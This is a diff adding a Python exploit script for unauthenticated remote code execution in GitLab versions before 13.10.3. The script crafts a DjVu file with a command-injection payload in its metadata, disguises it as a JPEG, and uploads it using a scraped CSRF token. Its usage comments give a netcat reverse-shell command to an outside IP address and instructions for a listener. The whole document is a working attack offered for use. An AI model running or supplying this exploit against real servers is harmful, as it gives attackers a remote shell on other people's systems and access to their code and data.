@@ -1,0 +1,71 @@
+# Usage
+
+# Step 1
+# Need install djvumake & djvulibre to work
+# Install djvulibre ( if you haven't installed it yet
+# sudo apt-get install -y djvulibre-bin
+
+# Step 2: Run exploit
+# python3 exploit.py -t <gitlab_url> -c <command>
+# Example <command> -> `nc -e /bin/sh 10.10.0.43 4444`
+# Make sure to start a netcat listener first: `nc -nlvp 4444`
+
+
+import requests
+from bs4 import BeautifulSoup
+import base64
+import random
+import os
+import argparse
+
+parser = argparse.ArgumentParser(description='GitLab < 13.10.3 Unauthenticated RCE')
+parser.add_argument(
+    '-t', help='URL (Eg: http://gitlab.example.com)', required=True)
+parser.add_argument('-c', help='Command to execute', required=True)
+args = parser.parse_args()
+
+gitlab_url = args.t
+command = args.c
+
+session = requests.Session()
+
+r = session.get(gitlab_url + "/users/sign_in")
+soup = BeautifulSoup(r.text, features="lxml")
+token = soup.findAll('meta')[16].get("content")
+
+# RCE Payload
+rce_payload = f'(metadata\n\t(Copyright "\\\n" . qx{{{command}}} . \\\n" b ") )\n'.encode()
+# Write payload to a text file
+with open("rce.txt", "wb") as text_file:
+    text_file.write(rce_payload)
+
+# Checking if djvumake is installed
+check = os.popen('which djvumake').read()
+if (check == ""):
+    exit("djvumake not installed. Install by running command : sudo apt install djvulibre-bin")
+
+# Create a djvu file with metadata payload, and then rename it to .jpg file
+os.system("djvumake rce.djvu INFO=0,0 BGjp=/dev/null ANTa=rce.txt && mv rce.djvu rce.jpg")
+
+# Upload file
+upload_file_url = f"{gitlab_url}/uploads/user"
+cookies = {'sidebar_collapsed': 'false', 'event_filter': 'all',
+           'hide_auto_devops_implicitly_enabled_banner_1': 'false', "_gitlab_session": session.cookies["_gitlab_session"], }
+
+files = {"file": ("rce.jpg", open("rce.jpg", "rb"), "image/jpeg")}
+resp = session.post(
+    url=upload_file_url,
+    files=files,
+    headers={
+        "X-CSRF-Token": token,
+        "Referer": upload_file_url,
+        "Accept": "application/json"
+    }, cookies=cookies)
+
+if "The change you requested was rejected." in resp.text:
+    exit("[x] Upload file failed")
+elif "Failed to process image" in resp.text:
+    print("[+] RCE triggered successfully")
+
+# Clean up
+os.system("rm rce.jpg && rm rce.txt")
